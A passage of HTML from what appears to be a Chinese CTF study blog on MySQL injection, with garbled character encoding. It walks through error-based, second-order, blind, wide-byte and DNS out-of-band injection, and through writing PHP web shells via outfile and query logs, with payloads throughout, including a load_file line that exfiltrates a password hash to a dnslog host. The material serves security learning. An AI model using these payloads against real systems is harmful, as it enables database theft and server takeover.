class="line">?id=1&quot;or(updatexml(1,concat(0x7e,(select(substr(group_concat(schema_name),1,32))from (information_schema.schemata)),0x7e),1))--+</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">çˆ†è¡¨ï¼š</span><br><span class="line">id=1&quot;or(updatexml(1,concat(0x7e,(select(substr(group_concat(table_name),1,32))from (information_schema.tables)where(table_schema=&#x27;å·²çŸ¥åº“å&#x27;)),0x7e),1))--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">çˆ†åˆ—åï¼š</span><br><span class="line">id=1&quot;or(updatexml(1,concat(0x7e,(select( substr(group_concat(column_name),1,32)))from(information_schema.columns)where(table_name=&#x27;flag&#x27;))),1))--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">çˆ†å­—æ®µå€¼</span><br><span class="line">id=1&quot;or(updatexml(1,concat(0x7e,(select( substr(group_concat(real_flag_1s_here),1,6)))from(users))),1))--+</span><br></pre></td></tr></table></figure><h4 id="äºŒæ¬¡æ³¨å…¥â€“å­˜å‚¨å‹æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥â€“å­˜å‚¨å‹æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥â€“å­˜å‚¨å‹æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥â€“å­˜å‚¨å‹æ³¨å…¥</h4><h5 id="åŸç†-3"><a href="#åŸç†-3" class="headerlink" title="åŸç†"></a>åŸç†</h5><p><img src="/../images/1.png" alt="ctf1"></p><p>å¸¸è§è½¬ä¹‰å‡½æ•°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">addslashes</span>()</span><br><span class="line"><span class="title function_ invoke__">mysql_escape_string</span>()</span><br></pre></td></tr></table></figure><p>ä»¥<code>sql-labs Less-24</code>ä¸ºä¾‹</p><p>åˆ›å»ºç”¨æˆ·</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span>=  <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line"><span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into users ( username, password) values(\&quot;<span class="subst">$username</span>\&quot;, \&quot;<span class="subst">$pass</span>\&quot;)&quot;</span>;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸æ°å½“çš„å‡½æ•°<code>mysql_escape_string</code>ï¼ŒåŠŸèƒ½ä¸ºåœ¨ MySQL ä¸­å…·æœ‰ç‰¹æ®Šå«ä¹‰çš„å­—ç¬¦ï¼ˆå¦‚å•å¼•å·ã€åŒå¼•å·ã€åæ–œæ å’Œç©ºå­—èŠ‚ï¼‰å‰æ·»åŠ åæ–œæ å­—ç¬¦ã€‚æ‰€ä»¥è„æ•°æ®è¿˜æ˜¯è¿›å…¥åˆ°äº†æ•°æ®åº“ä¸­ã€‚</p><p>ä¿®æ”¹å¯†ç å¤„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure><p>ç›´æ¥å°†è„æ•°æ®å–å‡ºå¹¶æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­ï¼Œé€ æˆäº†sqlæ³¨å…¥ã€‚</p><h5 id="å¸¸è§åœºæ™¯"><a href="#å¸¸è§åœºæ™¯" class="headerlink" title="å¸¸è§åœºæ™¯"></a>å¸¸è§åœºæ™¯</h5><p>å°†ä¿å­˜çš„è„æ•°æ®ä»æ•°æ®åº“ä¸­å–å‡ºï¼Œå†æ¬¡è¿›è¡Œsqlæ“ä½œçš„åœºæ™¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¿®æ”¹å¯†ç ï¼Œä¿®æ”¹è®¢å•ç­‰ä¿®æ”¹å·²ä¿å­˜ä¿¡æ¯çš„åœ°æ–¹</span><br><span class="line">æ³¨å†Œç”¨æˆ·åå¤„</span><br></pre></td></tr></table></figure><h5 id="ä¾‹é¢˜-1"><a href="#ä¾‹é¢˜-1" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h5><h6 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$address</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]);<span class="comment">#å¯æ§å˜é‡</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;<span class="comment">#å°†$_POST[&quot;address&quot;]ä¿å­˜åˆ°æ•°æ®åº“ä¸­</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();<span class="comment">#$rowä¿å­˜sqlè¯­å¥æŸ¥è¯¢ç»“æœ</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];<span class="comment">#è°ƒç”¨äº†æŸ¥è¯¢ç»“æœ</span></span><br></pre></td></tr></table></figure><p>åˆ†æä¸Šé¢ä¸¤æ¡è¯­å¥ï¼Œå¯¹å¯æ§å‚æ•°addressåªè¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œå°±ä¿å­˜åˆ°æ•°æ®åº“ä¸­ã€‚</p><p>å¹¶ä¸”åœ¨updateä¸­å¼•ç”¨äº†<code>$row[&#39;address&#39;]</code>ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œå­˜åœ¨äºŒæ¬¡æ³¨å…¥ã€‚</p><p>å¯ä»¥çœ‹åˆ°åˆ—åä¸ºold_addressï¼Œåœ¨è¿›è¡Œä¿®æ”¹æ—¶ï¼Œä¼šå°†æ—§åœ°å€ä¿å­˜ä¸‹æ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦åœ¨ç¬¬ä¸€æ¬¡ä¿®æ”¹æ—¶ï¼Œåœ¨addresså¤„æ³¨å…¥æ¶æ„ä»£ç ï¼Œç¬¬äºŒæ¬¡ä¿®æ”¹æŸ¥è¯¢æ—§åœ°å€æ—¶å°±ä¼šæ‰§è¡Œæ¶æ„ä»£ç ã€‚</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),1,20)),0x7e),1)# </span><br></pre></td></tr></table></figure><h4 id="ç›²æ³¨â€“æ— å›æ˜¾æ³¨å…¥"><a href="#ç›²æ³¨â€“æ— å›æ˜¾æ³¨å…¥" class="headerlink" title="ç›²æ³¨â€“æ— å›æ˜¾æ³¨å…¥"></a>ç›²æ³¨â€“æ— å›æ˜¾æ³¨å…¥</h4><p>æ¨èé˜…è¯»ï¼š<a href="https://www.anquanke.com/post/id/266244">https://www.anquanke.com/post/id/266244</a></p><h5 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h5><p>é¡µé¢æ— æ•°æ®å›æ˜¾ï¼Œä½†æ˜¯æœ‰ä¸¤ç§è¿”å›çŠ¶æ€</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=1 --+ # True</span><br><span class="line">?id=1&#x27; and 1=2 --+ # False</span><br></pre></td></tr></table></figure><p>å®é™…</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=å­æŸ¥è¯¢ --+  </span><br></pre></td></tr></table></figure><p>å­æŸ¥è¯¢&#x3D;å­—ç¬¦ä¸²æˆªå–+æ¯”è¾ƒ</p><h6 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h6><p><code>and 1=</code></p><table><thead><tr><th align="center">é€»è¾‘è¿æ¥ç¬¦</th><th align="center">payload</th></tr></thead><tbody><tr><td align="center">æˆ–</td><td align="center">or ï¼Œ||</td></tr><tr><td align="center">å¼‚æˆ–</td><td align="center">xorï¼Œ^</td></tr><tr><td align="center">æŒ‰ä½ä¸&#x2F;æˆ–</td><td align="center">&amp;ï¼Œ|</td></tr></tbody></table><p>å­—ç¬¦ä¸²æˆªå–</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ä»startä½ç½®å¼€å§‹,æˆªå–lenä¸ªå­—ç¬¦</span><br><span class="line">substr(string,start,len)</span><br><span class="line">mid(string,start,len)</span><br><span class="line"></span><br><span class="line"># ä»å·¦/å³æˆªå–lenä¸ªå­—ç¬¦</span><br><span class="line">left(string,len)</span><br><span class="line">right(string,len)</span><br></pre></td></tr></table></figure><p>æ¯”è¾ƒ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like binary 0x25&#123;&#125;&#123;&#125;25</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230505230426015.png" alt="image-20230505230426015"></p><blockquote><p>å› ä¸ºå¤§å°å†™ä¸æ•æ„Ÿï¼Œæ‰€ä»¥è¦ç”¨<code>binary</code></p><p>BINARYå°†16è¿›åˆ¶è½¬åŒ–ä¸ºå­—ç¬¦ä¸²</p></blockquote><p>è¯­æ³•</p><table><thead><tr><th align="center">like</th><th align="center">æ­£åˆ™</th></tr></thead><tbody><tr><td align="center">_</td><td align="center">.</td></tr><tr><td align="center">%</td><td align="center">.*</td></tr><tr><td align="center">[]</td><td align="center">[]</td></tr><tr><td align="center">[^]</td><td align="center">[^]</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">regexp &quot;^a&quot;</span><br><span class="line">regexp &quot;^ab&quot;</span><br></pre></td></tr></table></figure><h5 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h5><p>æ—¶é—´ç›²æ³¨å°±æ˜¯<strong>åœ¨å¸ƒå°”ç›²æ³¨ä¸ŠåŠ äº†å»¶è¿Ÿæ—¶é—´å‡½æ•°sleep()</strong>,ç”¨åœ¨Trueå’ŒFalseå›æ˜¾éš¾ä»¥åŒºåˆ†æ—¶,é€šè¿‡é¡µé¢çš„å“åº”æ—¶é—´æ¥åˆ¤æ–­å¸ƒå°”é€»è¾‘çš„æ­£ç¡®ä¸å¦ã€‚</p><h6 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(å¸ƒå°”,A,B)ä¸ä¸‰ç›®è¿ç®—ç¬¦é€»è¾‘ä¸€æ ·,åŠ ä¸Šsleepå‡½æ•°</span><br><span class="line"></span><br><span class="line">sleep(if(å¸ƒå°”,A,B))å¸ƒå°”æ­£ç¡®,å»¶è¿ŸAç§’,å¸ƒå°”é”™è¯¯,å»¶è¿ŸBç§’</span><br><span class="line"></span><br><span class="line">æˆ–è€… if(å¸ƒå°”,1,sleep(x))å¸ƒå°”æ­£ç¡®,æ— å»¶è¿Ÿ,å¸ƒå°”é”™è¯¯,å»¶è¿Ÿxç§’</span><br></pre></td></tr></table></figure><p>![image-20230312232840696](..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;typora img&#x2F;image-20230312232840696.png)</p><h6 id="ç»•è¿‡-1"><a href="#ç»•è¿‡-1" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h6><p>èƒ½é€ æˆå»¶æ—¶æ•ˆæœçš„è¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># é€šè¿‡æ‰§è¡Œå¤šæ¬¡å‘½ä»¤å½¢æˆå»¶æ—¶</span><br><span class="line">benchmark(æ‰§è¡Œæ¬¡æ•°,sqlè¯­å¥)</span><br><span class="line"></span><br><span class="line"># æŸ¥è¯¢ä¸€äº›æ•°æ®é‡æ¯”è¾ƒå¤§çš„è¡¨åšç¬›å¡å°”é›†è¿ç®—ï¼Œå¯¼è‡´æŸ¥è¯¢ç¼“æ…¢</span><br><span class="line">select * from tab1 cross join tab2;</span><br><span class="line">select * from tab1,tab2;</span><br></pre></td></tr></table></figure><h5 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h5><p>ç›²æ³¨éƒ½æ˜¯éœ€è¦è„šæœ¬çš„ï¼Œæˆ–è€…ç”¨sqlmap</p><h4 id="DNSå¤–å¸¦æ³¨å…¥"><a href="#DNSå¤–å¸¦æ³¨å…¥" class="headerlink" title="DNSå¤–å¸¦æ³¨å…¥"></a>DNSå¤–å¸¦æ³¨å…¥</h4><p>æ¨èé˜…è¯»ï¼š<a href="https://www.anquanke.com/post/id/98096">Dnslogåœ¨SQLæ³¨å…¥ä¸­çš„å®æˆ˜-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°</a></p><h5 id="åŸç†-4"><a href="#åŸç†-4" class="headerlink" title="åŸç†"></a>åŸç†</h5><ol><li><p>MySQL Load_File()å‡½æ•°å¯ä»¥å‘èµ·è¯·æ±‚ï¼Œä½¿ç”¨Dnslogæ¥æ”¶è¯·æ±‚ï¼Œè·å–æ•°æ®ï¼›</p></li><li><p>windowsä¸‹å­˜åœ¨<code>UNCè·¯å¾„</code></p><blockquote><p>UNCæ˜¯ä¸€ç§å‘½åæƒ¯ä¾‹, ä¸»è¦ç”¨äºåœ¨Microsoft Windowsä¸ŠæŒ‡å®šå’Œæ˜ å°„ç½‘ç»œé©±åŠ¨å™¨. UNCå‘½åæƒ¯ä¾‹æœ€å¤šè¢«åº”ç”¨äºåœ¨å±€åŸŸç½‘ä¸­è®¿é—®æ–‡ä»¶æœåŠ¡å™¨æˆ–è€…æ‰“å°æœºã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\xxxx\xx</span><br></pre></td></tr></table></figure><p>   <img src="/../images/image-20230425175525555.png" alt="image-20230425175525555"></p><p>   <img src="/../images/image-20230425175452805.png" alt="image-20230425175452805"></p></li></ol><h5 id="ä½¿ç”¨æ¡ä»¶"><a href="#ä½¿ç”¨æ¡ä»¶" class="headerlink" title="ä½¿ç”¨æ¡ä»¶"></a>ä½¿ç”¨æ¡ä»¶</h5><ul><li>windowsç³»ç»Ÿ</li><li><code>secure_file_priv</code>ä¸ºç©º</li></ul><h5 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">SELECT</span> hex(passwd) <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> LIMIT <span class="number">1</span>),<span class="string">&#x27;.mysql.2fzz61.dnslog.cn\\abc&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Hexç¼–ç çš„ç›®çš„æ˜¯å‡å°‘å¹²æ‰°ï¼ŒåŸŸåæœ‰ä¸€å®šçš„è§„èŒƒï¼Œæœ‰äº›ç‰¹æ®Šå­—ç¬¦ä¸èƒ½å¸¦å…¥</span></span><br><span class="line"><span class="comment">-- \\\\è½¬ä¹‰  â†’  \\</span></span><br></pre></td></tr></table></figure><h4 id="SMBå¤–å¸¦æ³¨å…¥"><a href="#SMBå¤–å¸¦æ³¨å…¥" class="headerlink" title="SMBå¤–å¸¦æ³¨å…¥"></a>SMBå¤–å¸¦æ³¨å…¥</h4><p><a href="http://www.moonslow.com/article/smb_sql_injection">http://www.moonslow.com/article/smb_sql_injection</a></p><h4 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h4><h5 id="åŸç†-5"><a href="#åŸç†-5" class="headerlink" title="åŸç†"></a>åŸç†</h5><p>From:<a href="https://cloud.tencent.com/developer/article/1938545">https://cloud.tencent.com/developer/article/1938545</a></p><p>å®½å­—èŠ‚ï¼šå¦‚æœä¸€ä¸ªå­—ç¬¦çš„å¤§å°æ˜¯ä¸¤ä¸ªå­—èŠ‚çš„ï¼Œè¯¥å­—ç¬¦ç§°ä¸ºå®½å­—èŠ‚å­—ç¬¦</p><p><code>PHP</code>ä¸<code>Mysql</code>ä¹‹é—´çš„äº¤äº’</p><p><img src="/../images/5917903e25c36c63ec29ad5237c2f7a4.png" alt="img"></p><p>å°†phpçš„sqlè¯­å¥ä»¥<code>character_set_client</code>ç¼–ç ï¼ˆä¹Ÿå°±æ˜¯è½¬ä¸º16è¿›åˆ¶æ•°ï¼‰ï¼Œå†å°†16è¿›åˆ¶æ•°ä»¥<code>character_set_connection</code>è¿›è¡Œç¼–ç ï¼ˆä¹Ÿå°±æ˜¯è½¬æ¢ä¸ºurlç¼–ç ï¼‰ï¼Œç„¶åä»¥å†…éƒ¨æ“ä½œå­—ç¬¦é›†è¿›è¡Œurlè§£ç ï¼Œæœ€åä»¥<code>character_set_results</code>ç¼–ç è¾“å‡ºç»“æœã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">%df%<span class="number">27</span> æµè§ˆå™¨urlè‡ªåŠ¨è§£ç ===&gt; Î²<span class="string">&#x27; è½¬ä¹‰===&gt;Î²\&#x27;è½¬ä¸º16è¿›åˆ¶===&gt; 0xdf0x5c0x27 è½¬æ¢ä¸ºurlç¼–ç ===&gt; %df%5c%27 è¿›è¡Œurlè§£ç (å› ä¸ºæ˜¯GBKç¼–ç ï¼Œ%dfå’Œ%5cç»“åˆä¸ºæ±‰å­—)===&gt; é‹&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="ä¾‹é¢˜-2"><a href="#ä¾‹é¢˜-2" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h5><p><code>sql-lab less-32</code></p><p>è½¬ä¹‰å­—ç¬¦</p><p><img src="/../images/image-20230522170722857.png" alt="image-20230522170722857"></p><p>è®¾ç½®ç¼–ç é›†</p><p><img src="/../images/image-20230522170750335.png" alt="image-20230522170750335"></p><p>sqlè¯­å¥ï¼Œå•å¼•å·é—­åˆ</p><p><img src="/../images/image-20230522171701503.png" alt="image-20230522171701503"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522171728569.png" alt="image-20230522171728569"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span>%df%<span class="number">27</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522171841053.png" alt="image-20230522171841053"></p><h5 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%df&#x27;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ Linux è‡ªå¸¦çš„ iconv å‘½ä»¤è¿›è¡Œ UTF çš„ç¼–ç è½¬æ¢</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo \&#x27;|iconv -f utf-8 -t utf-16</span><br><span class="line">echo \&#x27;|iconv -f utf-8 -t utf-32</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523121013028.png" alt="image-20230523121013028"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1ï¿½&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523121159948.png" alt="image-20230523121159948"></p><h4 id="order-by-æ³¨å…¥"><a href="#order-by-æ³¨å…¥" class="headerlink" title="order by æ³¨å…¥"></a>order by æ³¨å…¥</h4><p><a href="https://www.cnblogs.com/1ink/p/15107674.html">https://www.cnblogs.com/1ink/p/15107674.html</a></p><h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><h5 id="å†™æ–‡ä»¶"><a href="#å†™æ–‡ä»¶" class="headerlink" title="å†™æ–‡ä»¶"></a>å†™æ–‡ä»¶</h5><h6 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h6><ul><li><p>é«˜æƒé™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user, file_priv from mysql.user; </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230528210141344.png" alt="image-20230528210141344"></p></li><li><p>çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„</p></li><li><p><code>secure_fil_priv</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@secure_file_priv;</span><br><span class="line">show global variables like &#x27;%secure_file_priv%&#x27;; # showè¯­å¥è¦å †å æ³¨å…¥å’Œå›æ˜¾</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20230522174929267.png" alt="image-20230522174929267"></p><h6 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h6><p><strong>åŸºäºè”åˆæŸ¥è¯¢</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select *from users where id=1 union select 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into outfile &#x27;C:\info.php&#x27;;</span><br><span class="line"></span><br><span class="line">select *from users where id=1 union select 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into  dumpfile &#x27;C:\info2.php&#x27;;</span><br></pre></td></tr></table></figure><p><code>outfile</code>å’Œ<code>dumpfile</code>çš„åŒºåˆ«</p><ul><li><code>outfile</code>å¯¼å‡ºæ•°æ®æ”¯æŒå¤šè¡Œï¼Œ<code>dumpfile</code>åªæ”¯æŒä¸€è¡Œ</li><li><code>outfile</code>ä¼šå¯¹æ•°æ®è¿›è¡Œè½¬ä¹‰ï¼Œ<code>dumpfile</code>ä¸ä¼š</li></ul><p>æ‰€ä»¥ä½¿ç”¨<code>into dumpfile</code>è¿™ä¸ªå‡½æ•°æ¥å†™å…¥äºŒè¿›åˆ¶æ–‡ä»¶</p><p><img src="/../images/image-20230522180009679.png" alt="image-20230522180009679"></p><p><strong>éè”åˆæŸ¥è¯¢</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select *from users where id=1 into outfile &#x27;C:\info.php&#x27; fields terminated by &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">select *from users where id=1 into outfile &#x27;C:\info2.php&#x27; lines terminated by &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522180543767.png" alt="image-20230522180543767"></p><h5 id="å†™å…¥æ—¥å¿—æ–‡ä»¶"><a href="#å†™å…¥æ—¥å¿—æ–‡ä»¶" class="headerlink" title="å†™å…¥æ—¥å¿—æ–‡ä»¶"></a>å†™å…¥æ—¥å¿—æ–‡ä»¶</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># --æŸ¥çœ‹é…ç½®ï¼Œæ—¥å¿—æ˜¯å¦å¼€å¯ï¼Œå’Œmysqlé»˜è®¤logåœ°å€(è®°ä¸‹åŸåœ°å€æ–¹ä¾¿æ¢å¤)</span><br><span class="line">show variables like &#x27;%general%&#x27;;</span><br><span class="line"></span><br><span class="line">set global general_log = on;</span><br><span class="line"></span><br><span class="line">set global general_log_file = &#x27;e:\info.php&#x27;; # è¿™é‡Œæ—¥å¿—åˆ›å»ºæƒé™è¦ä½ä¸€äº›ï¼Œä¸èƒ½åœ¨cç›˜åˆ›å»º</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">--ç»“æŸåï¼Œç—•è¿¹æ¸…ç†</span><br></pre></td></tr></table></figure><p>æ—¥å¿—æ…¢æŸ¥è¯¢</p><p>Fromï¼š<a href="https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html">https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html</a></p><blockquote><p>ä¸ºä»€ä¹ˆè¦ç”¨æ…¢æŸ¥è¯¢å†™å‘¢ï¼Ÿå› ä¸ºå¼€å¯æ—¥å¿—ç›‘æµ‹åæ–‡ä»¶ä¼šå¾ˆå¤§ï¼Œç½‘ç«™è®¿é—®é‡å¤§çš„è¯æˆ‘ä»¬å†™çš„shellä¼šå‡ºé”™</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%slow_query_log%&#x27;;--æŸ¥çœ‹æ…¢æŸ¥è¯¢ä¿¡æ¯</span><br><span class="line">set global slow_query_log=1;--å¯ç”¨æ…¢æŸ¥è¯¢æ—¥å¿—(é»˜è®¤ç¦ç”¨)</span><br><span class="line">set global slow_query_log_file=&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;;--ä¿®æ”¹æ—¥å¿—æ–‡ä»¶è·¯å¾„</span><br><span class="line"></span><br><span class="line">show global variables like &#x27;%long_query_time%&#x27;;</span><br><span class="line">--æŸ¥çœ‹é»˜è®¤æ—¶é—´å€¼ï¼Œå½“sqlè¯­å¥æ‰§è¡Œæ—¶é—´è¶…è¿‡è¯¥å€¼æ‰ä¼šè¢«è®¡å…¥æ—¥å¿—ä¸­ï¼Œé»˜è®¤10ç§’</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php @eval($_POST[abc]);?&gt;&#x27; or sleep(@@long_query_time+1);--å†™shellåˆ°æ…¢æŸ¥è¯¢æ—¥å¿—</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522182142555.png" alt="image-20230522182142555"></p><h5 id="sqlmap-â€“os-shell"><a href="#sqlmap-â€“os-shell" class="headerlink" title="sqlmap  â€“os-shell"></a>sqlmap  â€“os-shell</h5><ul><li><p>å¤§è‡´æµç¨‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è·å–ç›®æ ‡ä¿¡æ¯â†’ä½¿ç”¨lines terminated byå°†å…·æœ‰æ–‡ä»¶ä¸Šä¼ çš„ğŸä¸Šä¼ åˆ°ç½‘ç«™â†’é€çº§ç›®å½•è®¿é—®æ‰¾åˆ°ğŸ</span><br><span class="line"></span><br><span class="line">â†’é€šè¿‡è¯¥ğŸä¸Šä¼ çœŸæ­£çš„å‘½ä»¤ğŸâ†’æµ‹è¯•å‘½ä»¤ğŸèƒ½å¦æ‰§è¡Œâ†’åˆ é™¤ä¸Šä¼ çš„ä¸¤ä¸ªğŸ</span><br></pre></td></tr></table></figure></li><li><p>æ–‡ä»¶ä¸Šä¼ ğŸï¼šformè¡¨å•</p></li><li><p>phpå‘½ä»¤é©¬ï¼šè·å¾—<code>disable_function</code>ï¼Œéå†æ‰€æœ‰ä»£ç æ‰§è¡Œï¼Œå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œåˆ¤æ–­å“ªä¸€ä¸ªä¸åœ¨<code>disable_function</code>ã€‚</p></li></ul><h4 id="è¯»æ–‡ä»¶"><a href="#è¯»æ–‡ä»¶" class="headerlink" title="è¯»æ–‡ä»¶"></a>è¯»æ–‡ä»¶</h4><h5 id="LOAD-DATA-LOCALâ€”ä»»æ„è¯»å–"><a href="#LOAD-DATA-LOCALâ€”ä»»æ„è¯»å–" class="headerlink" title="LOAD DATA LOCALâ€”ä»»æ„è¯»å–"></a><code>LOAD DATA LOCAL</code>â€”ä»»æ„è¯»å–</h5><h6 id="è„šæœ¬-1"><a href="#è„šæœ¬-1" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h6><p><a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p><h6 id="åŸç†å’Œæ”»å‡»æ€è·¯"><a href="#åŸç†å’Œæ”»å‡»æ€è·¯" class="headerlink" title="åŸç†å’Œæ”»å‡»æ€è·¯"></a>åŸç†å’Œæ”»å‡»æ€è·¯</h6><p><a href="https://paper.seebug.org/1112/">CSS-T | Mysql Client ä»»æ„æ–‡ä»¶è¯»å–æ”»å‡»é“¾æ‹“å±•</a></p><blockquote><p>æ–‡ä»¶è¯»å–<code>Phar</code>æ–‡ä»¶ï¼Œé€ æˆphpååºåˆ—åŒ–</p></blockquote><h6 id="æ¡ä»¶-1"><a href="#æ¡ä»¶-1" class="headerlink" 